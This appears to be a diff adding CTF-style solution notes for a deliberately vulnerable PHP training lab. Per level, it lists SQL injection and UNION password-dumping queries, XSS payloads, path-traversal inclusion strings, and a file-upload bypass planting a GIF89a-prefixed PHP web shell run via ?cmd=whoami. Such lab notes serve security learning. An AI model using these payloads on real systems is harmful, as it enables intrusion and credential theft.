@@ -1,0 +1,79 @@
+== Command Execution ==
+/CommandExec-1.php
+	Username: 
+		ping cnn.com
+		mkdir shell
+		dir C:
+		dir *
+		comex1/log1.txt
+
+
+
+== SQL Injection ==
+
+/sql1.php
+	"' or 1=1  -- "
+	"' UNION (SELECT TABLE_NAME FROM information_schema.tables);-- "
+	"' UNION (SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'users');-- "
+	"' UNION (SELECT username FROM users);-- "
+	"' UNION (SELECT password FROM users);-- "
+/sql2.php
+	mysqli_error() is present
+	"1 or 1=1 -- "
+/sql3.php
+	mysqli_error() is present
+	"1' or 1=1 -- "
+/sql4.php
+	mysqli_error() is present
+	"1 or 1=1 -- "
+
+
+
+== XSS ==
+
+/XSS_level1.php
+	<script>alert('Ha-Ha-Ha')</script>
+	<input type="submit" onclick="alert('haha')">
+/XSS_level2.php
+	<script >alert('Ha-Ha-Ha')</script>
+	<SCRIPT>alert('Ha-Ha-Ha')</SCRIPT>
+/XSS_level3.php
+	<b onmouseover=alert('Ha-Ha-Ha!')>click me!</b>
+/XSS_level4.php
+	<b onmouseover=alert('Ha-Ha-Ha!')>click me!</b>
+/XSS_level5.php
+	could be using UTF-7
+
+
+
+== File Inclusion ==
+
+/lvl1.php
+	"?file=dontOpen/hint1/hint1.php"
+	"?file=../hint2/hint2.php"
+/lvl2.php
+	"?file=dontOpen/hint1/hint1.php"
+	"?file=....//hint2/hint2.php"
+/lvl3.php
+	"?file=dontOpen/%5Chint1/%5Chint1"
+	"?file=....\%5Chint2/%5Chint2"
+/lvl4.php
+	"?file=dontOpen/hint1/hint1.php.php"
+	"?file=../hint2/hint2.php.php"
+
+
+
+
+== FileUpload ==
+
+/fileupload1.php
+	php file can be uploaded
+	and uploaded file path is displayed
+/fileupload2.php
+	https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/
+	use Burp proxy HTTP History tab
+	trick validation with this:
+	Content-Disposition: form-data; name="file"; filename="webshell.jpg.php"
+	Content-Type: image/jpeg
+/fileupload3.php
+	can add GIF89a; at the beginning of code like "GIF89a; <?php system($_GET['cmd']); ?>" and than execute commands like shell.php?cmd=whoami
